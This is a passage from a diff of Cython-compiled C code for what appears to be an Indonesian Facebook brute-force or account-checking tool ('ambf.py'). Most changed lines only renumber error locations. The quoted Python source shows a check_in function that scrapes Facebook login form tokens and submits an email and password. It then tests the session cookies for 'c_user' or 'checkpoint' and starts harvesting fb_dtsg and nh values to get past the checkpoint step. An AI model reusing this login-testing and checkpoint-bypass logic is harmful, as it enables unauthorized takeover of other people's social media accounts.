+      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __pyx_t_4 = NULL;
       if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
@@ -19895,10 +19654,10 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       }
       __pyx_t_6 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_n_s_name) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_n_s_name);
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
-      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 646, __pyx_L1_error)
+      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_6);
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 646, __pyx_L1_error)
+      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_i, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_4);
       __pyx_t_3 = NULL;
       if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
@@ -19912,18 +19671,18 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       }
       __pyx_t_5 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_n_s_value) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_n_s_value);
       __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 646, __pyx_L1_error)
+      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-      if (PyDict_SetItem(__pyx_t_1, __pyx_t_6, __pyx_t_5) < 0) __PYX_ERR(0, 646, __pyx_L1_error)
+      if (PyDict_SetItem(__pyx_t_1, __pyx_t_6, __pyx_t_5) < 0) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
-      __pyx_t_5 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_data, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 646, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_data, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 639, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
       __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
 
-      /* "ambf.py":645
+      /* "ambf.py":638
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  * 	for i in fm.find_all("input"):
  * 		if i.get("name") in list:             # <<<<<<<<<<<<<<
@@ -19933,7 +19692,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       goto __pyx_L5;
     }
 
-    /* "ambf.py":648
+    /* "ambf.py":641
  * 			data.update({i.get("name"):i.get("value")})
  * 		else:
  * 			continue             # <<<<<<<<<<<<<<
@@ -19945,7 +19704,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __pyx_L5:;
 
-    /* "ambf.py":644
+    /* "ambf.py":637
  * 	fm = ged.find("form",{"method":"post"})
  * 	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
  * 	for i in fm.find_all("input"):             # <<<<<<<<<<<<<<
@@ -19956,34 +19715,34 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   }
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
 
-  /* "ambf.py":649
+  /* "ambf.py":642
  * 		else:
  * 			continue
  * 	data.update({"email":user,"pass":pasw})             # <<<<<<<<<<<<<<
  * 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
  * 	if "c_user" in ses.cookies:
  */
-  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 649, __pyx_L1_error)
+  __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 642, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_email, __pyx_v_user) < 0) __PYX_ERR(0, 649, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_pass, __pyx_v_pasw) < 0) __PYX_ERR(0, 649, __pyx_L1_error)
-  __pyx_t_5 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_data, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 649, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_email, __pyx_v_user) < 0) __PYX_ERR(0, 642, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_pass, __pyx_v_pasw) < 0) __PYX_ERR(0, 642, __pyx_L1_error)
+  __pyx_t_5 = __Pyx_CallUnboundCMethod1(&__pyx_umethod_PyDict_Type_update, __pyx_v_data, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 642, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_5);
   __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
   __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
 
-  /* "ambf.py":650
+  /* "ambf.py":643
  * 			continue
  * 	data.update({"email":user,"pass":pasw})
  * 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")             # <<<<<<<<<<<<<<
  * 	if "c_user" in ses.cookies:
  * 		print(" [!] akun tidak checkpoint")
  */
-  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_parser); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_2);
-  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_1);
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_fm, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_fm, __pyx_n_s_get); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __pyx_t_3 = NULL;
   if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
@@ -19997,27 +19756,27 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   }
   __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_n_s_action) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_n_s_action);
   __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
-  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 650, __pyx_L1_error)
+  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_4 = PyNumber_Add(__pyx_v_mb, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
-  __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_6);
   __Pyx_GIVEREF(__pyx_t_4);
   PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_4);
   __pyx_t_4 = 0;
-  __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
-  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 650, __pyx_L1_error)
-  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_allow_redirects, Py_True) < 0) __PYX_ERR(0, 650, __pyx_L1_error)
-  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_6, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 650, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 643, __pyx_L1_error)
+  if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_allow_redirects, Py_True) < 0) __PYX_ERR(0, 643, __pyx_L1_error)
+  __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_6, __pyx_t_4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_3);
   __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
   __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
   __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
-  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 650, __pyx_L1_error)
+  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 643, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_4);
   __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
   __pyx_t_3 = NULL;
@@ -20035,7 +19794,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCALL
   if (PyFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_4, __pyx_kp_s_html_parser};
-    __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 643, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
@@ -20044,14 +19803,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   #if CYTHON_FAST_PYCCALL
   if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
     PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_t_4, __pyx_kp_s_html_parser};
-    __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 643, __pyx_L1_error)
     __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
   } else
   #endif
   {
-    __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 650, __pyx_L1_error)
+    __pyx_t_6 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 643, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
     if (__pyx_t_3) {
       __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_3); __pyx_t_3 = NULL;
@@ -20062,7 +19821,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     __Pyx_GIVEREF(__pyx_kp_s_html_parser);
     PyTuple_SET_ITEM(__pyx_t_6, 1+__pyx_t_7, __pyx_kp_s_html_parser);
     __pyx_t_4 = 0;
-    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 650, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_6, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 643, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
   }
@@ -20070,30 +19829,30 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
   __pyx_v_run = __pyx_t_5;
   __pyx_t_5 = 0;
 
-  /* "ambf.py":651
+  /* "ambf.py":644
  * 	data.update({"email":user,"pass":pasw})
  * 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
  * 	if "c_user" in ses.cookies:             # <<<<<<<<<<<<<<
  * 		print(" [!] akun tidak checkpoint")
  * 	elif "checkpoint" in ses.cookies:
  */
-  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 651, __pyx_L1_error)
+  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 644, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_5);
-  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 651, __pyx_L1_error)
+  __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 644, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
   __pyx_t_10 = (__pyx_t_11 != 0);
   if (__pyx_t_10) {
 
-    /* "ambf.py":652
+    /* "ambf.py":645
  * 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
  * 	if "c_user" in ses.cookies:
  * 		print(" [!] akun tidak checkpoint")             # <<<<<<<<<<<<<<
  * 	elif "checkpoint" in ses.cookies:
  * 		form = run.find("form")
  */
-    if (__Pyx_PrintOne(0, __pyx_kp_s_akun_tidak_checkpoint) < 0) __PYX_ERR(0, 652, __pyx_L1_error)
+    if (__Pyx_PrintOne(0, __pyx_kp_s_akun_tidak_checkpoint) < 0) __PYX_ERR(0, 645, __pyx_L1_error)
 
-    /* "ambf.py":651
+    /* "ambf.py":644
  * 	data.update({"email":user,"pass":pasw})
  * 	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
  * 	if "c_user" in ses.cookies:             # <<<<<<<<<<<<<<
@@ -20103,28 +19862,28 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     goto __pyx_L6;
   }
 
-  /* "ambf.py":653
+  /* "ambf.py":646
  * 	if "c_user" in ses.cookies:
  * 		print(" [!] akun tidak checkpoint")
  * 	elif "checkpoint" in ses.cookies:             # <<<<<<<<<<<<<<
  * 		form = run.find("form")
  * 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
  */
-  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 653, __pyx_L1_error)
+  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 646, __pyx_L1_error)
   __Pyx_GOTREF(__pyx_t_5);
-  __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 653, __pyx_L1_error)
+  __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_checkpoint, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 646, __pyx_L1_error)
   __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
   __pyx_t_11 = (__pyx_t_10 != 0);
   if (__pyx_t_11) {
 
-    /* "ambf.py":654
+    /* "ambf.py":647
  * 		print(" [!] akun tidak checkpoint")
  * 	elif "checkpoint" in ses.cookies:
  * 		form = run.find("form")             # <<<<<<<<<<<<<<
  * 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
  * 		jzst = form.find("input",{"name":"jazoest"})["value"]
  */
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_run, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 654, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_run, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 647, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __pyx_t_6 = NULL;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -20138,24 +19897,24 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     }
     __pyx_t_5 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_6, __pyx_n_s_form) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_n_s_form);
     __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
-    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 654, __pyx_L1_error)
+    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 647, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
     __pyx_v_form = __pyx_t_5;
     __pyx_t_5 = 0;
 
-    /* "ambf.py":655
+    /* "ambf.py":648
  * 	elif "checkpoint" in ses.cookies:
  * 		form = run.find("form")
  * 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]             # <<<<<<<<<<<<<<
  * 		jzst = form.find("input",{"name":"jazoest"})["value"]
  * 		nh   = form.find("input",{"name":"nh"})["value"]
  */
-    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 655, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 648, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
-    __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 655, __pyx_L1_error)
+    __pyx_t_6 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 648, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_6);
-    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_name, __pyx_n_s_fb_dtsg) < 0) __PYX_ERR(0, 655, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_name, __pyx_n_s_fb_dtsg) < 0) __PYX_ERR(0, 648, __pyx_L1_error)
     __pyx_t_4 = NULL;
     __pyx_t_7 = 0;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
@@ -20171,7 +19930,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCALL
     if (PyFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_n_s_input, __pyx_t_6};
-      __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 648, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
@@ -20180,14 +19939,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCCALL
     if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
       PyObject *__pyx_temp[3] = {__pyx_t_4, __pyx_n_s_input, __pyx_t_6};
-      __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 648, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
     } else
     #endif
     {
-      __pyx_t_3 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 655, __pyx_L1_error)
+      __pyx_t_3 = PyTuple_New(2+__pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 648, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_3);
       if (__pyx_t_4) {
         __Pyx_GIVEREF(__pyx_t_4); PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_4); __pyx_t_4 = NULL;
@@ -20198,29 +19957,29 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
       __Pyx_GIVEREF(__pyx_t_6);
       PyTuple_SET_ITEM(__pyx_t_3, 1+__pyx_t_7, __pyx_t_6);
       __pyx_t_6 = 0;
-      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 655, __pyx_L1_error)
+      __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 648, __pyx_L1_error)
       __Pyx_GOTREF(__pyx_t_5);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     }
     __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
-    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_value); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 655, __pyx_L1_error)
+    __pyx_t_2 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_value); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 648, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_2);
     __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
     __pyx_v_dtsg = __pyx_t_2;
     __pyx_t_2 = 0;
 
-    /* "ambf.py":656
+    /* "ambf.py":649
  * 		form = run.find("form")
  * 		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
  * 		jzst = form.find("input",{"name":"jazoest"})["value"]             # <<<<<<<<<<<<<<
  * 		nh   = form.find("input",{"name":"nh"})["value"]
  * 		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
  */
-    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 656, __pyx_L1_error)
+    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_form, __pyx_n_s_find); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 649, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_5);
-    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L1_error)
+    __pyx_t_3 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 649, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
-    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_name, __pyx_n_s_jazoest) < 0) __PYX_ERR(0, 656, __pyx_L1_error)
+    if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_name, __pyx_n_s_jazoest) < 0) __PYX_ERR(0, 649, __pyx_L1_error)
     __pyx_t_6 = NULL;
     __pyx_t_7 = 0;
     if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
@@ -20236,7 +19995,7 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCALL
     if (PyFunction_Check(__pyx_t_5)) {
       PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_n_s_input, __pyx_t_3};
-      __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 649, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
@@ -20245,14 +20004,14 @@ static PyObject *__pyx_pf_4ambf_34check_in(CYTHON_UNUSED PyObject *__pyx_self, P
     #if CYTHON_FAST_PYCCALL
     if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
       PyObject *__pyx_temp[3] = {__pyx_t_6, __pyx_n_s_input, __pyx_t_3};
-      __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 656, __pyx_L1_error)
+      __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp+1-__pyx_t_7, 2+__pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 649, __pyx_L1_error)
       __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
       __Pyx_GOTREF(__pyx_t_2);
       __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
     } else
     #endif
     {
